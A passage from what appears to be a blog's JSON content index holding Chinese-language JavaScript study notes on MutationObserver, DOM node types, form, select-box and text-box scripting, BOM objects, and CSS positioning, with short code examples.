changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;observer.disconnect();document.body.className=&#x27;bar&#x27;;//无日志输出//让已经入队的回调函数执行完毕后再调用disconnect()setTimeout(()=&gt;&#123; observer.disconnect(); document.body.className=&#x27;bar&#x27;;&#125;,0); 复用MutationObserver12345678910let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.target)));let childA=document.createElement(&#x27;div&#x27;); childB=document.createElement(&#x27;span&#x27;);document.body.appendChild(childA);document.body.appendChild(childB);observer.observe(childA,&#123;attributes:true&#125;);observer.observe(childB,&#123;attributes:true&#125;);childA.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);childB.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//[div, span] 重用MutationObserver调用diaconnect()不会结束MutationObserver的生命，还可以重新使用这个观察者，再将它关联到新的目标结点 MutationObserverInit与观察范围观察属性设置attributes为true,观察所有属性 123456789let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);//添加属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//修改属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;);//移除属性document.body.removeAttribute(&#x27;foo&#x27;); 用attributeFilter添加白名单属性 123456let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributeFilter:[&#x27;foo&#x27;]&#125;);//添加白名单属性document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);//添加被排除的属性document.body.setAttribute(&#x27;baz&#x27;,&#x27;qux&#x27;); 在记录中保存属性原来的值 123456let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.oldValue)));observer.observe(document.body,&#123;attributeOldValue:true&#125;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;bar&#x27;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;);document.body.setAttribute(&#x27;foo&#x27;,&#x27;qux&#x27;);//[null, &#x27;bar&#x27;, &#x27;baz&#x27;] 观察字符数据12345678910111213let observer=new MutationObserver(document.body.firstChild,&#123;characterData:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;//创建要观察的文本节点observer.observe(document.body.firstChild,&#123;characterData:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;document.body.firstChild.textContent=&#x27;bar&#x27;;document.body.firstChild.textContent=&#x27;baz&#x27;;//使用characterDataOldValuelet observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords.map((x)=&gt;x.oldValue)));document.body.firstChild.textContent=&#x27;foo&#x27;;//创建要观察的文本节点observer.observe(document.body.firstChild,&#123;characterDataOldValue:true&#125;);document.body.firstChild.textContent=&#x27;foo&#x27;;document.body.firstChild.textContent=&#x27;bar&#x27;;document.body.firstChild.textContent=&#x27;baz&#x27;; 观察子节点12345678document.body.innerHTML=&#x27;&#x27;;let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));//创建两个初始子节点document.body.appendChild(document.createElement(&#x27;div&#x27;));document.body.appendChild(document.createElement(&#x27;span&#x27;));observer.observe(document.body,&#123;childList:true&#125;);document.body.insertBefore(document.body.lastChild,document.body.firstChild);//发生两次变化，先移除节点再添加节点 观察子树12345document.body.innerHTML=&#x27;&#x27;;let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));document.body.appendChild(document.createElement(&#x27;div&#x27;));observer.observe(document.body,&#123;attributes:true,subtree:true&#125;);document.body.firstChild.setAttribute(&#x27;foo&#x27;,&#x27;baz&#x27;); 异步回调与记录队列takeRecords()方法清空记录队列，取出并·返回其中的所有MutationRecord实例,可以用在希望断开与观察目标的联系，但又希望处理由于disconnect()而被抛弃的记录队列中的MutationRecord实例 12345678let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;document.body.className=&#x27;bar&#x27;;console.log(observer.takeRecords());console.log(observer.takeRecords());//[MutationRecord, MutationRecord]//[]","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"DOM-节点层级","slug":"DOM-节点层级","date":"2021-12-12T09:13:55.000Z","updated":"2022-01-24T08:14:25.394Z","comments":true,"path":"2021/12/12/DOM-节点层级/","link":"","permalink":"https://coloey.github.io/2021/12/12/DOM-%E8%8A%82%E7%82%B9%E5%B1%82%E7%BA%A7/","excerpt":"","text":"Node类型DOM Level 描述为名为Node的接口，Node接口在JavaScript中被实现为Node类型，所有结点都继承Node类型，因此所有类型都共享相同的基本属性和方法。 节点类型可通过与这些常量比较来确定 12345678//节点类型可通过与这些常量比较确定，如果两者相等，则意味着someNode是一个元素节点if(someNode.nodeType==Node.ELEMENT_NODE)&#123; alert(&quot;Node is an element&quot;);&#125;//nodeName和nodeValue保存着有关节点的信息if(someNode.nodeType==1)&#123; value=someNode.nodeName;//会显示元素的标签名&#125; 节点关系节点与其他节点的关系可形容为家族关系，每个节点有一个childNodes属性其中包含一个NodeList的实例，NodeList是一个类数组对象，它是DOM结构的查询，DOM结构的变化会自动地在NodeList中反映出来，用于存储可以按位置存取的有序节点。可以使用中括号或者item()方法访问它的值 1234let firstChild=someNode.childNodes[0];let secondChild=someNode.childNodes.item(1);let count=someNode.childNodes.length;let arrayofNodes=Array.from(someNode.childNodes); parentNode指向DOM树中的父元素，childNode中所有节点都有同一个父元素，parentNode指向同一个节点，childNodes列表中每个结点都是同一列表中其他节点的同胞节点，使用previousSibling和nextSibling可以在这个列表的节点间导航。 hasChildNodes()节点返回true则说明节点有一个或多个子节点。 ownerDocument属性是一个指向代表整个文档的文档节点的指针 操纵节点appendChild():用于在childNodes列表末尾添加节点，返回新添加的节点。 123let returnedNode=someNode.appendChild(newNode);alert(returnedNode==newNode);//truealert(someNode.lastChild==newNode);//true inserBefore():接收两个参数，要插入的节点和参照节点。要插入的节点会变成参照节点的前一个同胞节点，并被返回 12345678910returnedNode=someNode.insertBefore(newNode,null);alert(newNode==someNode.lastChild);//true//作为新的第一个子节点插入retunedNode=someNode.insertBefore(newNode,someNode.firstChild);alert(returnedNode==newNode);//truealert(newNode==someNode.fiestChild);//true//插入最后一个子节点的前面returnedNode==someNode.insertBefore(newNode,someNode.lastChild);alert(newNode==someNode.childNodes[someNode.childNodes.length-2]);//true replaceChild():接收两个参数，要插入的节点和要替换的节点。要替换的节点被返回并从文档中被移除 1returnedNode=someNode.replaceChild(newNode,someNode.lastChild);//替换最后一个子节点 removeChild():接收一个参数，即要被移除的节点，被移除的节点会被返回 1let formerFirstChild=someNode.removeChild(someNode.firstChild); cloneNode():传入true参数会进行深复制，即复制节点和整个子DOM树；传入false进行浅复制，只会复制该方法的节点。复制返回的节点属于文档所有，但未指定父节点，称为孤儿节点，通过appendChild()和insertBefore()，replaceChild()方法把孤儿节点添加到文档中 normalize():处理文本节点，如果发现空文本节点则将其删除否则如果两个同胞节点相邻则将其合并为一个文本节点 Document类型表示文档节点的类型,document是HTMLDocument的实例（HTMLDocument继承Document）,表示整个HTML页面，document是window对象的属性是一个全局对象。 nodetype等于9 nodeName值为“#document” nodevalue值为null parentNode值为null ownerDocument值为null 子节点可以使DocumentType(最多一个)，Element(最多一个)，ProcessingInstruction或Comment类型 文档子节点documentElement:始终指向HTML页面中的元素 1234567&lt;html&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;let html=document.documentElement;//取得对&lt;html&gt;的引用alert(html===document.childNodes[0]);alert(html===document.firstChild); document.body:直接指向body元素，取得对body的引用 文档信息title:显示浏览器窗口或标签页的标题栏 URL:包含当前页面的完整URL domain:包含页面的域名 referrer:包含空字符串 123//document.URL=&quot;http://www.wrox.com/WileyCDA/&quot;,document.domain就是www.wrox.comdocument=&quot;wrrox.com&quot;;//成功document=&quot;nczonline.net&quot;;//出错,不能给这个属性设置URL中不包含的值 当页面中包含来自某个不同子域的窗格（)或内嵌窗格()设置document.domain是有用的，比如一个加载自www.wrox.com的页面包含一个内嵌窗格其中的页面加载自p2p.wrox.com，这两个页面包含不同的字符串，内部和外部不能相互访问对方的JavaScript对象，如果每个页面都把document.domain设置为wrox.com,那两个页面就可以相互通信 12document.domain=&quot;wrox.com&quot;;//放松，成功document.doman=&quot;p2p2.wrox.com&quot;;//收紧，失败,一旦放松就不能收紧 定位元素getElementById()：接收一个要获取元素的ID，如果找到这个元素则返回，没找到返回null。参数I必须跟元素在页面中大的id属性完全匹配，包括大小写 12&lt;div id=&quot;myDiv&quot;&gt;ome text&lt;/div&gt;let div=document.getElementById(&quot;myDiv&quot;);//取得对&lt;div&gt;的引用,如果存在多个相同ID的元素则返回在文档中的第一个元素 getElementsByTagName():接收一个参数，即要获取元素的标签名,返回包含0个或多个元素的NodeList，在HTML文档中返回一个HTMLCollection对象 12345678910let images=document.getElementsByTagName(&quot;img&quot;);alert(images.length);//图片数量alert(images[0].src);//第一张图片的src属性alert(images.item(0).src);//通过name属性获得引用&lt;img src=&quot;myImage.gif&quot; name=&quot;myImage&quot;&gt;;let myImage=images.namedItem(&quot;myImage&quot;);//images[&quot;myImage&quot;]//取得文档的所有元素let allElements=document.getElementsByTagName(&quot;*&quot;); getElementsByName():返回具有给定name属性的所有元素，常用于单选按钮 12345678910&lt;fieldset&gt; &lt;legend&gt;Which color do you prefer?&lt;/legend&gt; &lt;ul&gt; &lt;li&gt; &lt;input type=&quot;radio&quot; value=&quot;red&quot; name=&quot;color&quot; id=&quot;colorRed&quot;&gt;&lt;label for=&quot;colorRed&quot;&gt;Red&lt;/label&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=&quot;radio&quot; value=&quot;blue&quot; name=&quot;color&quot; id=&quot;colorBlue&quot;&gt;&lt;label for=&quot;colorBlue&quot;&gt;Blue&lt;/label&gt; &lt;/li&gt; let radios=document.getElementsByName(&quot;color&quot;); Element类型 nodeType=1 nodeName值为元素的标签名 nodeValue的值为null parentNode值为Document或Element对象 子节点可以是Element,Text,Comment,ProcessingInstruction等类型 通过nodeName或tagName属性获得元素的标签名 1234567891011121314151617181920//使用对象属性&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt; &lt;script&gt; let div=document.getElementById(&quot;myDiv&quot;); alert(div.tagName);//&quot;DIV&quot; alert(div.tagName==div.nodeName);//true if(element.tagName.toLowerCase()==&quot;div&quot;)&#123; //,HTML中，元素标签名以答谢表示，XML中标签名与代码中的大小写一致，不确定脚本是HTML还是XML运行，推荐将标签名转换为小写形式，适合所有文档 &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; HTML元素 id:元素在文档中的唯一标识符 title：包含元素的额外信息，通常以提示条形式展示 lang：元素内容的语言代码 dir：语言的书写方向（ltr从左到右，rtl从右到左) className:相当于class属性，用于指定元素的CSS类 取得属性1234567891011121314151617181920212223//使用对象属性&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;myDiv&quot; class=&quot;bd&quot; title=&quot;Body text&quot; lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;2&lt;/div&gt; &lt;script&gt; var div=document.getElementById(&quot;myDiv&quot;); alert(div.id); alert(div.className); alert(div.title); alert(div.lang); alert(div.dir); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;//使用getAttribute()方法alert(div.getAttribute(&quot;class&quot;)); getAttribute()主要用于取得自定义属性的值，其他情况使用对象属性 设置属性setAttribute():接收两个参数，要设置的属性名和属性值,如果属性存在则用指定的值替换原来的值 1234567//直接给对象属性赋值div.id=&quot;someOtherId&quot;//在对象属性上添加自定义属性，不会让它变成元素的属性div.mycolor=&quot;red&quot;;alert(div.getAttribute(&quot;mycolor&quot;));//null//使用setAttribute赋值div.setAttribute(&quot;id&quot;,&quot;someOtherId&quot;); attributes属性attributes属性包含一个NamedNodeMap实例，是一个类似NodeList的“实时”集合，元素的每个属性都表示为一个Attr节点，并保存在NamedNodeMap对象中 attributed属性中的每个节点的nodeName是对应属性的名字，nodeValue是属性的值 12345678function outputAttributes(element)&#123; let pairs=[]; for(let i=0,len=element.attributes.length;i&lt;len;++i)&#123; const attribute=element.attributes[i]; pairs.push(`$&#123;attribute.nodeName&#125;=$&#123;attribute.nodeValue&#125;`); return pairs.join(&quot; &quot;); &#125;&#125; 创建元素document.createElement():一个参数，即要创建元素的标签名 1234let div=document.createElement(&quot;div&quot;);div.id=&quot;myNewDiv&quot;;div.className=&quot;box&quot;;document.body.appendChild(div); Text 类型Text节点由Text类型表示，包含按字面解释的纯文本，也可能包含转义后的HTML字符，Text节点中包含的文本可以通过nodeValue或者data属性访问 nodetype=3 nodeName=”#text” nodeValue值为节点中包含的文本 parentNode值为Element对象 不支持子节点 appendData(text):向节点末尾添加文本text deleteData(offset,count),从位置offset开始删除count个字符 insertData(offset,text),在位置offset插入text； replaceData(offset,count,text)，用text替换从位置offset到offset+count大的文本 splitText(offset),在位置offset将当前文本节点拆分为两个文本节点 substringData(offset,count),提取从位置offset到offset+count的文本 包含文本内容的每个元素最多只能有一个文本节点 创建文本节点document.createTextNode():创建新文本节点，接收一个参数，即要插入节点的文本 123456789let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello world!&quot;);element.appendChild(textNode);let anotherTextNode=document.createTextNode(&quot;Yippee&quot;);element.appendChild(anotherTextNode);document.body.appendChild(element); 规范化文本节点合并文本节点1234567891011let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello World&quot;);element.appendChild(textNode);let anotherTextNode=document.createTextNode(&quot;Yippee&quot;);element.appendChild(anotherTextNode);document.body.appendChild(element);alert(element.childNodes.length);//2element.normalize();alert(element.childNodes.length);//1alert(element.firstChild.nodeValue); 拆分文本节点12345678910let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello World&quot;);element.appendChild(textNode);document.body.appendChild(element);let newNode=element.firstChild.splitText(5);alert(element.fiestChild.nodeValue);//&quot;Hello&quot;alert(newNode.nodeValue);//&quot;world&quot;alert(element.chileNodes.length);//2 Comment类型 nodeType=8 nodeName=”#comment” nodeValue值为注释内容 parentNode值为Document或Element对象 不支持子节点 Comment类型与Text类型继承自同一个基类(CharacterData),因此拥有除splitText之外的Text节点所有的字符串操作方法 CDATASection类型继承Text类型，拥有除splitText之外的Text节点所有的字符串操作方法 DocumentType类型 在DOM Level1中不支持动态创建，只能在解析文档代码时创建，DocumentType对象保存在document.doctype属性中. DocumentType对象有3个属性：name,entities,notations. name是文档名称，entities是这个文档类型描述实体的NameNodeMap,而notations是这个文档类型描述的表示法的NamedNodeMap. 浏览器文档通常是HTML或XHTML类型，所以entities和notations列表为空，只有name属性有用，包含文档类型的名称 DocumentFragment类型 nodeType=11 nodeName=”#document-fragment” nodeValue=null parentNode=null 子节点可以是Element,ProcessingInstruction,Comment,Text,CDATASection 充当其他要被添加的文档节点的仓库 123456789&lt;ul id=&quot;myList&quot;&gt;&lt;/ul&gt;let fragment=document.createDocumentFragment();let ul=document.getElementById(&quot;myList&quot;);for(let i=0;i&lt;3;i++)&#123; let li=document.createElement(&quot;li&quot;); li.appendChild(document.createTextNode(`Item $&#123;i+1&#125;`)); fragment.appendChild(li);&#125;ul.appendChild(fragment); Attr类型属性是存在于元素attributes属性中的节点 nodeType=2 nodeName值为属性名 nodeValue值为属性值 parentNode值为null Attr对象上3个属性 name包含属性名 value包含属性值 specified是一个布尔值，表示属性使用的是默认值和还是被指定的值 1234567let attr=document.createAttribute(&quot;align&quot;);//创建新的Attr节点，参数为属性名attr.value=&quot;left&quot;;element.setAttributeNode(attr);//添加属性节点alert(element.attributes[&quot;align&quot;].value);//返回对应属性节点alert(element.getAttributeNode(&quot;align&quot;).value);//返回对应属性节点alert(element.getAttribute(&quot;align&quot;));//只返回属性值","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"选择框编程","slug":"选择框编程","date":"2021-12-12T09:07:36.000Z","updated":"2021-12-30T07:18:26.023Z","comments":true,"path":"2021/12/12/选择框编程/","link":"","permalink":"https://coloey.github.io/2021/12/12/%E9%80%89%E6%8B%A9%E6%A1%86%E7%BC%96%E7%A8%8B/","excerpt":"","text":"选项处理使用选择框的selectedIndex属性 123456789101112131415161718192021222324252627282930 &lt;form method=&quot;post&quot;&gt; &lt;select name=&quot;location&quot; id=&quot;selLocation&quot;&gt; &lt;option value=&quot;Sunnyvalue,CA&quot;&gt;Sunnyvalue&lt;/option&gt; &lt;option value=&quot;Los Angeles,CA&quot;&gt;Los Angeles&lt;/option&gt; &lt;option value=&quot;Mountain View,CA&quot;&gt;Mountain View&lt;/option&gt; &lt;option value=&quot;&quot;&gt;China&lt;/option&gt; &lt;option &gt;Australia&lt;/option&gt; &lt;/select&gt; &lt;/form&gt; &lt;script src=&quot;example3.js&quot;&gt;&lt;/script&gt; let selectbox=document.forms[0].elements[&quot;location&quot;];function getSelectedOptions(selectbox)&#123; let result=new Array(); for(let option of selectbox.options)&#123; if(option.selected)&#123; result.push(option); &#125; &#125; return result;&#125;let selectedOptions=getSelectedOptions(selectbox);let message=&quot;&quot;;for(let option of selectedOptions)&#123; message+=`Selected index:$&#123;option.index&#125;\\n`+`Selected text:$&#123;option.text&#125;\\n`+`Selected value:$&#123;option.value&#125;\\n`;&#125;console.log(message); 添加选项动态创建选项1234let newOption=document.createElement(&quot;option&quot;);newOption.appendChild(document.createTextNode(&quot;Option text&quot;));newOption.setAttribute(&quot;value&quot;,&quot;Option value&quot;);selectbox.appendChild(newOption); 使用Option构造函数创建选项,接收两个参数：text和value，用选择框的add方法添加选项 12let newOption=new Option(&quot;Option text&quot;,&quot;Option value&quot;);selectbox.add(newOption,undefined);//在列表末尾添加选项 移除选项123456789selectbox.removeChild(selectbox.options[0]);//移除第一项selectbox.remove(0);//移除第一项selectbox.options[0]=null;//清除选项框的所有选项function clearSelectbox(selectbox)&#123; for(let option of selectbox.options)&#123; selectbox.remove(0); &#125;&#125; 移动和重排选项1234let selectbox1=document.getElementById(&quot;selLocations1&quot;);let selectbox2=document.getElementById(&quot;selLocations2&quot;);selectbox2.appendChild(selectbox1.options[0]);//将选项从第一个选择框移动到另一个选择框 重排选项 123456let selectbox1=document.getElementById(&quot;selLocations1&quot;);let optionToMove=selectbox1.options[1];selectbox1.insertBefore(optionToMove,selectbox1.options[optionToMove.index-1]);//将要重排的选项移动到它原先位置的前前面let selectbox1=document.getElementById(&quot;selLocations1&quot;);let optionToMove=selectbox1.options[1];selectbox1.insertBefore(optionToMove,selectbox1.options[optionToMove.index+2]);//将要重排的选项移动到它原先位置的后面一位","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"文本框编程","slug":"文本框","date":"2021-12-09T12:46:20.000Z","updated":"2021-12-30T07:18:16.782Z","comments":true,"path":"2021/12/09/文本框/","link":"","permalink":"https://coloey.github.io/2021/12/09/%E6%96%87%E6%9C%AC%E6%A1%86/","excerpt":"","text":"文本框编程表示文本框的两种方式123456&lt;input type=&quot;text&quot; size=&quot;25&quot; maxlength=&quot;50&quot; value=&quot;initial value&quot;&gt; //创建多行文本框 &lt;textarea rows=&quot;25&quot; cols=&quot;5&quot;&gt;initial value&lt;/textarea&gt;//用使用value属性读写文本框let textbox=document.forms[0].elements[&quot;textbox1&quot;];textbox.value=&quot;Some new value&quot;; 选择文本select()用于全选文本 123456let form=document.getElementById(&quot;myForm&quot;); let textbox=form.elements[0]; textbox.addEventListener(&quot;focus&quot;,(event)=&gt;&#123; event.target.select(); console.log(`Text selected:$&#123;textbox.value&#125;`); &#125;); setSelectionRange()用于部分选择文本 1234567let form=document.getElementById(&quot;myForm&quot;);let textbox=form.elements[0];textbox.addEventListener(&quot;focus&quot;,(event)=&gt;&#123; event.target.select(); textbox.setSelectionRange(0,1); console.log(`Text selected:$&#123;textbox.value&#125;`); &#125;); 屏蔽按键12345textbox.addEventListener(&quot;keypress&quot;,(event)=&gt;&#123; if(!/\\d/.test(String.fromCharCode(event.charCode))&amp;&amp;event.charCode&gt;9&amp;&amp;!event.ctrlKey)&#123;//屏蔽非数字字符但允许同样触发keypress事件的所有基础按键以及ctrl键 event.preventDefault(); &#125;&#125;) 自动切换1234567891011121314151617181920212223242526&lt;form method=&quot;post&quot;&gt; &lt;input type=&quot;text &quot; name=&quot;tel1&quot; id=&quot;textTel1&quot; maxlength=&quot;3&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;tel2&quot; id=&quot;textTel2&quot; maxlength=&quot;3&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;tel3&quot; id=&quot;textTel3&quot; maxlength=&quot;4&quot;&gt; &lt;/form&gt; let inputIds=[&quot;textTel1&quot;,&quot;textTel2&quot;,&quot;textTel3&quot;];for(let id of inputIds)&#123; let textbox=document.getElementById(id); textbox.addEventListener(&quot;keyup&quot;,(event)=&gt;&#123; let target=event.target; if(target.value.length==target.maxLength)&#123; let form=target.form; for(let i=0,len=form.elements.length;i&lt;len;i++)&#123; if(form.elements[i]==target)&#123; if(form.elements[i+1])&#123; form.elements[i+1].focus(); &#125; return; &#125; &#125; &#125; &#125;); &#125;;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"表单","slug":"表单","date":"2021-12-09T12:11:33.000Z","updated":"2021-12-30T07:17:44.744Z","comments":true,"path":"2021/12/09/表单/","link":"","permalink":"https://coloey.github.io/2021/12/09/%E8%A1%A8%E5%8D%95/","excerpt":"","text":"表单禁用表单避免多次提交表单可以在第一次点击后禁用表单 12345678let form=document.getElementById(&quot;myForm&quot;);form.addEventListener(&quot;submit&quot;,(event)=&gt;&#123; let target=event.target; //取得提交按钮 let btn=target.elements[&quot;submit-btn&quot;]; //禁用提交按钮 btn.disabled=true;&#125;) focus()把焦点设置到表单字段,这意味着该字段会变成活动字段并可以响应键盘事件,autofocus()会自动为带有该属性的元素设置焦点 12345678let form=document.getElementById(&quot;myForm&quot;);window.addEventListener(&quot;load&quot;,(event)=&gt;&#123; let element=form.elements[0]; if(element.autofocus!==true)&#123; element.focus(); console.log(&quot;JS focus&quot;); &#125; &#125;) 表单的公共事件","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"BOM","slug":"BOM","date":"2021-11-25T12:47:05.000Z","updated":"2021-12-30T07:04:56.946Z","comments":true,"path":"2021/11/25/BOM/","link":"","permalink":"https://coloey.github.io/2021/11/25/BOM/","excerpt":"","text":"BOMlocation对象提供当前窗口加载文档的信息，以及通常的导航功能，它既是window的属性也是document的属性。 查询字符串123456789101112131415161718let getQueryStringArgs=function()&#123; //取得没有开头问号的查询字符串 let qs=(location.search.length&gt;0)?location.search.substring(1):&quot;&quot;; let args=&#123;&#125;; for(let item of(qs.split(&#x27;&amp;&#x27;).map(kv=&gt;kv.split(&#x27;=&#x27;))))&#123; let name=item[0]; value=item[1]; if(name.length)&#123; args[name]=value; &#125; &#125; return args;&#125;//qs=&quot;?q=javaScript&amp;num=10&quot;;let args=getQueryStringArgs();alert(args[&quot;q&quot;]);alert(args[&#x27;num&#x27;]); 使用USLSearchParams检查和修改查询字符串 123456789101112let qs=&quot;?q=javaScript&amp;num=10&quot;;let searchParams=new URLSearchParams(qs);alert(searchParams.toString());searchParams.has(&quot;num&quot;);searchParams.get(&quot;num&quot;);searchParams.set(&quot;page&quot;,&quot;3&quot;);alert(searchParams.toString());searchParams.delete(&quot;q&quot;);alert(searchParams.toString());for(let param of searchParams)&#123; console.log(param);&#125; 操作地址通过修改location对象修改浏览器地址，使用assign方法传进一个URL,会导航到新URL同时在浏览器历史记录增加一条记录，下面三种方法功能相同 123location.assign(&quot;http://www.wrox.com&quot;);window.location=&quot;http://www.wrox.com&quot;;location.href=&quot;http://www.wrox.com&quot;; 通过修改location属性可以修改当前加载的页面,hash,search,hostname,pathname.port属性被设置为新值后会修改当前的URL 123456789101112//假设当前URL为http://www.wrox.com/WileyCDA/location.assign(&quot;http://www.wrox.com/WileyCDA&quot;);//把URL修改为http://www.wrox.com/WileyCDA/#section1location.hash=&quot;#section1&quot;;//把URL修改为http://www.wrox.com/WileyCDA/?q=javascriptlocation.search=&quot;?q=javascript&quot;;//把URL修改为http://www.somewhere.com/WileyCDA/location.hostname=&quot;www.somewhere.com&quot;;//把URL修改为http://www.somewhere.com/mydir/location.pathname=&quot;mydir&quot;;//把URL修改为http://www.somewhere.com:8080/WileyCDA/location.port=8080; 以上的修改会在浏览器中增加记录，点击后退即可导航到前一个界面，不希望增加历史记录可以使用replace()方法，reload()可以重新加载当前页面，如果页面自从上次请求后没有修改过，则浏览器可能会从缓存中加载页面，如果想强制从服务器中加载，必须传入true history对象history用来导航历史记录，同时不会暴露用户访问过的URL。 12345678history.go(-1);//后退一页history.go(1);//前进一页history.go(&quot;wrox.com&quot;)//导航到最近的wrox.com页面//go有两个简写方法：back()和forward()history.back();//后退一页history.forward()//前进一页//history的length属性记录历史记录有多少条目if(history.length==1)&#123;//这是用户窗口第一个页面&#125; navigator对象navigator对象通常用来确定浏览器的类型 检测插件123456789101112131415161718192021222324252627282930313233343536function hasPlugin(name)&#123; name=name.toLowerCase(); for(let plugin of window.navigator.plugins)&#123; if(plugin.name.toLowerCase().indexOf(name)&gt;-1)&#123;return true;&#125; &#125; return false;&#125;//alert(hasPlugin(&quot;Flash&quot;));//alert(hasPlugin(&quot;QuickTime&quot;));function hasIEPlugin(name)&#123; try&#123; new ActiveXObject(name); return true; &#125;catch(ex)&#123; return false; &#125;&#125;//在所有浏览器中检测插件function hasFlash()&#123; var result=hasPlugin(&quot;Flash&quot;); if(!result)&#123; result=hasIEPlugin(&quot;ShockwaveFlash.ShockwaveFlash&quot;); &#125;return result;&#125;function hasQuickTime()&#123; var res=hasPlugin(&quot;QuickTime&quot;); if(!res)&#123; res=hasIEPlugin(&quot;QuickTime.QuickTime&quot;); &#125; return res;&#125;alert(hasFlash());alert(hasQuickTime()); 注册处理程序registerProtocolHandler()方法可以把一个网站注册处理为某种特定类型信息应用程序，传入3个参数：要处理的协议（“mailto或ftp),处理该协议的URL，以及应用名称 例如，把一个Web应用程序注册为默认客户端 1navigator.registerProtocolHandler(&quot;mailto&quot;,&quot;http://www.somemailclient.com?cmd=%s&quot;,&quot;Some Mail Client&quot;);","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"HTML+CSS","slug":"HTML+CSS","date":"2021-11-25T12:42:24.000Z","updated":"2021-12-30T07:17:34.845Z","comments":true,"path":"2021/11/25/HTML+CSS/","link":"","permalink":"https://coloey.github.io/2021/11/25/HTML+CSS/","excerpt":"","text":"定位：定位总结： static: 不脱标，不能使用边偏移 relative:不脱标（占有位置），可用margin,相对于自身位置移动 absolute:脱标（不占有位置）,不可用margin,带有定位的父级 fixed：脱标（不占有位置），浏览器可视区 sticky:不脱标（占有位置），浏览器可视区 绝对定位特点：如果没有祖先元素或者祖先元素没有定位，则以浏览器为准定位 如果祖先元素有定位（相对，绝对，固定定位）则以最近一级的有定位的祖先元素为参考点移动位置 绝对定位不占有原先的位置（脱标） 叠放次序 z-index在使用定位布局时，可以使用z-index来控制盒子的前后次序 语法： 选择器{z-index:1;} 数值可以是正整数，负整数或者0，默认是auto，数值越大，盒子越靠上 如果属性相同，则按照书写顺序，后来居上 数字后面不能加单位 只有定位的盒子才有z-index属性 定位的拓展1.绝对定位盒子居中 left:50% margin-left:-100px; 2.定位特殊性：绝对定位固定定位和浮动相似 行内元素添加绝对或者固定定位，可以直接设置高度和宽度（span) 块级元素添加绝对或者固定定位，如果不给宽度或者高度，默认大小是内容的大小 脱标的盒子不会触发外边距合并问题 3.绝对定位（固定定位）会完全压住盒子浮动元素只会压住下面标准流的盒子，但是不会压住下面标准流的文字（图片）但是绝对定位（固定定位）会压住下面标准流的所有内容 浮动之所以不会压住下面文字是因为浮动最初的目的是为了做文字环绕效果 元素里的显示和隐藏display 显示隐藏元素 但是不保留位置 隐藏元素不想要原来位置，用none，否则用block visibility显示隐藏元素 但是保留原来的位置,visible为元素可见，hidden为元素隐藏 overflow 溢出显示隐藏 但是只是对于溢出的部分处理,scoll:溢出的部分显示滚动条，visible:溢出部分可见,hidden:溢出部分不可见,auto:没溢出则不显示滚动条，溢出则超出部分显示滚动条。 用户界面样式鼠标样式cursorli &#123;cursor: pointer; &#125; default 默认小白鼠标 pointer 小手 move 移动 text 文本 not-allowed 禁止 vertical-align实现行内块和文字居中对齐vertical-align:middle 